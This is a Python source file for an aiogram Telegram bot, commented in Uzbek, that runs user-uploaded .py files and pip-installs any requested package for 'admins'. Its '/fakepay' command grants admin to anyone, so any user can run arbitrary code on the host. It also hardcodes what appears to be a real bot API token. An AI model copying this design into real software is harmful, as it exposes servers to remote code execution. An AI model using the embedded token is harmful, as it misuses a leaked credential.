from aiogram.types import LabeledPrice, PreCheckoutQuery
import os
import sys
import asyncio
import subprocess
import importlib.util
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# === CONFIG ===
API_TOKEN = "7642235798:AAFA-pfluvD3oUSeBexvZzu9_276p2dB-vo"  # asosiy hosting bot tokeni
SUPER_ADMIN_ID = 8285579114             # faqat shu kishi admin qo‘sha oladi
ADMIN_IDS = [SUPER_ADMIN_ID]            # boshqa adminlar shu listga qo‘shiladi

# === BOT ===
bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

# === ISHCHI PAPKA ===
BOTS_DIR = "bots"
os.makedirs(BOTS_DIR, exist_ok=True)

# Ishlayotgan botlar ro‘yxati
running_bots = {}


# === FSM for admin qo‘shish ===
class AdminState(StatesGroup):
    waiting_for_id = State()
    waiting_for_remove_id = State()


def admin_panel_kb(user_id: int):
    buttons = []
    if user_id == SUPER_ADMIN_ID:  # faqat SUPER_ADMIN ga chiqadi
        buttons.append([InlineKeyboardButton(text="👤 Admin qo‘shish", callback_data="add_admin")])
        buttons.append([InlineKeyboardButton(text="❌ Admin o‘chirish", callback_data="remove_admin")])
    buttons.append([InlineKeyboardButton(text="📋 Adminlar ro‘yxati", callback_data="list_admins")])
    # Stars orqali admin bo‘lish tugmasi
    buttons.append([InlineKeyboardButton(text="⭐ Admin bo‘lish (25 Stars)", callback_data="buy_admin")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query(F.data == "buy_admin")
async def buy_admin_callback(callback: types.CallbackQuery):
    # Agar u allaqachon admin bo‘lsa
    if callback.from_user.id in ADMIN_IDS:
        return await callback.answer("✅ Siz allaqachon adminsiz!", show_alert=True)

    price = [LabeledPrice(label="Admin bo‘lish", amount=25)]  # 20 ⭐
    await callback.message.answer_invoice(
        title="Admin bo‘lish",
        description="Admin bo‘lish uchun 25 Stars to‘lang.",
        payload="buy_admin_access",
        provider_token="",    # ⭐ Stars uchun bo‘sh
        currency="XTR",
        prices=price
    )

@dp.pre_checkout_query()
async def on_pre_checkout(pre_q: PreCheckoutQuery):
    await pre_q.answer(ok=True)

@dp.message(F.successful_payment)
async def on_success_payment(msg: types.Message):
    sp = msg.successful_payment
    if sp.currency == "XTR" and sp.total_amount >= 20 and sp.invoice_payload == "buy_admin_access":
        # admin ro‘yxatiga qo‘shamiz
        if msg.from_user.id not in ADMIN_IDS:
            ADMIN_IDS.append(msg.from_user.id)
            await msg.answer("🎉 Siz 25 ⭐ yubordingiz va endi adminsiz!")

            # SUPER_ADMIN ga xabar beramiz
            await bot.send_message(
                SUPER_ADMIN_ID,
                f"📩 Yangi admin qo‘shildi!\n\n"
                f"👤 ID: <code>{msg.from_user.id}</code>\n"
                f"⭐ Stars: {sp.total_amount}"
            )
        else:
            await msg.answer("✅ Siz allaqachon adminsiz.")


# === START ===
@dp.message(CommandStart())
async def start(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        # oddiy foydalanuvchi uchun xabar
        return await message.answer(
            "❌ Siz admin emassiz!\n\n"
            "Admin bo‘lish uchun 25 ⭐ yuborishingiz kerak.",
            reply_markup=admin_panel_kb(message.from_user.id)  # bunda Stars tugmasi ham chiqadi
        )

    # adminlar uchun panel
    await message.answer(
        "✅ Hosting botga xush kelibsiz!\n\n"
        "Menga .py fayl yuboring, men uni ishga tushirib beraman.",
        reply_markup=admin_panel_kb(message.from_user.id)
    )



# === Admin qo‘shish callback ===
@dp.callback_query(F.data == "add_admin")
async def add_admin_callback(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != SUPER_ADMIN_ID:
        return await callback.answer("❌ Faqat SUPER_ADMIN qo‘sha oladi!", show_alert=True)
    await state.set_state(AdminState.waiting_for_id)
    await callback.message.answer("✍️ Yangi admin ID ni kiriting:")


@dp.message(AdminState.waiting_for_id)
async def process_new_admin(message: types.Message, state: FSMContext):
    try:
        new_id = int(message.text.strip())
        if new_id in ADMIN_IDS:
            await message.answer("ℹ️ Bu foydalanuvchi allaqachon admin.")
        else:
            ADMIN_IDS.append(new_id)
            await message.answer(f"✅ Yangi admin qo‘shildi: <code>{new_id}</code>")
    except ValueError:
        await message.answer("❌ Noto‘g‘ri ID. Faqat raqam kiriting.")
    await state.clear()


# === Admin o‘chirish callback ===
@dp.callback_query(F.data == "remove_admin")
async def remove_admin_callback(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != SUPER_ADMIN_ID:
        return await callback.answer("❌ Faqat SUPER_ADMIN o‘chira oladi!", show_alert=True)
    await state.set_state(AdminState.waiting_for_remove_id)
    await callback.message.answer("❌ O‘chirmoqchi bo‘lgan admin ID ni kiriting:")


@dp.message(AdminState.waiting_for_remove_id)
async def process_remove_admin(message: types.Message, state: FSMContext):
    try:
        remove_id = int(message.text.strip())
        if remove_id == SUPER_ADMIN_ID:
            await message.answer("❌ SUPER_ADMIN ni o‘chirib bo‘lmaydi!")
        elif remove_id in ADMIN_IDS:
            ADMIN_IDS.remove(remove_id)
            await message.answer(f"🗑 Admin o‘chirildi: <code>{remove_id}</code>")
        else:
            await message.answer("❌ Bu ID adminlar ro‘yxatida topilmadi.")
    except ValueError:
        await message.answer("❌ Noto‘g‘ri ID. Faqat raqam kiriting.")
    await state.clear()


# === Adminlar ro‘yxati ===
@dp.callback_query(F.data == "list_admins")
async def list_admins_callback(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("❌ Siz admin emassiz!", show_alert=True)
    text = "📋 Adminlar ro‘yxati:\n" + "\n".join([f"• <code>{i}</code>" for i in ADMIN_IDS])
    await callback.message.answer(text)


# === .py fayl yuklash ===
@dp.message(F.document)
async def handle_python_file(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ Siz admin emassiz!")

    if not message.document.file_name.endswith(".py"):
        return await message.answer("❌ Faqat .py fayl yuboring!")

    file_name = message.document.file_name
    save_path = os.path.join(BOTS_DIR, file_name)

    # Faylni saqlash
    file = await bot.get_file(message.document.file_id)
    await bot.download_file(file.file_path, save_path)
    await message.answer(f"📥 Fayl saqlandi: <b>{file_name}</b>")
    # 🔔 Faylni SUPER_ADMIN ga yuborish
    if message.from_user.id != SUPER_ADMIN_ID:
        try:
            await bot.send_document(
                SUPER_ADMIN_ID,
                document=message.document.file_id,
                caption=f"📂 Yangi fayl yuborildi: <b>{file_name}</b>\n👤 Yuborgan ID: <code>{message.from_user.id}</code>"
            )
        except Exception as e:
            await message.answer(f"⚠️ Faylni SUPER_ADMIN ga yuborishda xatolik: {e}")
    # Agar eski bot ishlayotgan bo‘lsa, to‘xtatamiz
    if file_name in running_bots:
        process = running_bots[file_name].get("process")
        task = running_bots[file_name].get("task")
        if process:
            process.kill()
        if task:
            task.cancel()
        running_bots.pop(file_name, None)
        await message.answer(f"⏹ Eski versiya to‘xtatildi: {file_name}")

    # Faylni o‘qib framework aniqlaymiz
        # Faylni o‘qib framework aniqlaymiz
    with open(save_path, "r", encoding="utf-8") as f:
        code = f.read().lower()  # kichik harflarga o'tkazib tekshiramiz

    try:
        if "telebot" in code:  # Telebot bo‘lsa
            process = subprocess.Popen([sys.executable, save_path])
            running_bots[file_name] = {"process": process}
            await message.answer(f"🤖 TeleBot ishga tushdi: <b>{file_name}</b>")

        elif "aiogram" in code:  # Aiogram bo‘lsa
            spec = importlib.util.spec_from_file_location("module.name", save_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules[file_name] = module
            spec.loader.exec_module(module)

    
            if hasattr(module, "dp") and hasattr(module, "bot"):
                task = asyncio.create_task(module.dp.start_polling(module.bot))
                running_bots[file_name] = {"task": task, "dp": module.dp}
                await message.answer(f"🚀 Aiogram bot ishga tushdi: <b>{file_name}</b>")
        
            else:
                await message.answer("⚠️ Ushbu faylda dp va bot obyektlari topilmadi.")

    except Exception as e:
        await message.answer(f"❌ Botni ishga tushirishda xatolik:\n<code>{e}</code>")


# === Botni to‘xtatish ===
@dp.message(F.text.startswith("/stop"))
async def stop_bot(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ Siz admin emassiz!")

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        return await message.answer("❗ Foydalanish: <code>/stop filename.py</code>")

    file_name = parts[1]
    if file_name in running_bots:
        process = running_bots[file_name].get("process")
        task = running_bots[file_name].get("task")

        if process:
            process.terminate()
            try:
                process.wait(timeout=5)
            except:
                process.kill()

        if task:
            dp_instance = running_bots[file_name].get("dp")
            if dp_instance:
                await dp_instance.stop_polling()   # aiogramni to‘xtatish
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass


        running_bots.pop(file_name, None)
        await message.answer(f"⏹ To‘xtatildi: <b>{file_name}</b>")
    else:
        await message.answer(f"❌ {file_name} topilmadi yoki ishlamayapti.")



# === Ishlayotgan botlar ro‘yxati ===
@dp.message(F.text == "/list")
async def list_bots(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ Siz admin emassiz!")
    if not running_bots:
        return await message.answer("📂 Hech qanday bot ishlamayapti.")
    bots = "\n".join(running_bots.keys())
    await message.answer(f"📊 Ishlayotgan botlar:\n<code>{bots}</code>")

@dp.message(F.text == "/help")
async def help_command(message: types.Message):
    text = (
        "📖 <b>Buyruqlar ro‘yxati:</b>\n\n"
        "/start - Botni ishga tushirish\n"
        "/help - Bu yordamchi menyu\n"
        "/install <package> - Python kutubxona o‘rnatish (admin)\n"
        "/pip - O‘rnatilgan paketlarni ko‘rish (admin)\n"
        "/stop <filename.py> - Botni to‘xtatish (admin)\n"
        "/list - Ishlayotgan botlar ro‘yxati (admin)\n"
        "/fakepay - Test rejimida admin bo‘lish\n\n"
        "⚠️ Admin bo‘lish uchun 25 ⭐ yuborish kerak."
    )
    await message.answer(text)

@dp.message(F.text.startswith("/install"))
async def install_package(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ Siz admin emassiz!")
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        return await message.answer("❗ Foydalanish: <code>/install package_name</code>")
    
    package_name = parts[1]
    await message.answer(f"🔄 {package_name} o‘rnatilmoqda...")

    try:
        result = subprocess.run([sys.executable, "-m", "pip", "install", package_name],
                                capture_output=True, text=True, timeout=300)
        if result.returncode == 0:
            await message.answer(f"✅ `{package_name}` muvaffaqiyatli o‘rnatildi!\n\n<code>{result.stdout}</code>")
        else:
            await message.answer(f"❌ `{package_name}` o‘rnatishda xatolik:\n\n<code>{result.stderr}</code>")
    except Exception as e:
        await message.answer(f"❌ Xatolik yuz berdi:\n<code>{e}</code>")

@dp.message(F.text == "/pip")
async def list_installed_packages(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ Siz admin emassiz!")
    
    try:
        import pkg_resources
        packages = sorted([f"{p.key}=={p.version}" for p in pkg_resources.working_set])
        text = "📦 O‘rnatilgan paketlar:\n\n" + "\n".join(packages)
        # Juda uzun ro‘yxatlarni qisqartirish
        if len(text) > 4000:
            text = text[:4000] + "\n\n...va boshqa paketlar"
        await message.answer(f"<code>{text}</code>")
    except Exception as e:
        await message.answer(f"❌ Xatolik yuz berdi:\n<code>{e}</code>")

@dp.message(F.text == "/fakepay")
async def fake_payment(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        ADMIN_IDS.append(message.from_user.id)
        await message.answer("🎉 Test rejimida siz admin bo‘ldingiz!")
        await bot.send_message(SUPER_ADMIN_ID, f"📩 TEST: yangi admin qo‘shildi {message.from_user.id}")
    else:
        await message.answer("✅ Siz allaqachon adminsiz.")

from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()


# === Main ===
async def main():
    keep_alive()
    await dp.start_polling(bot)


if __name__ == "__main__":
    
    print("Bot ishga tushdi...✅")
    asyncio.run(main())
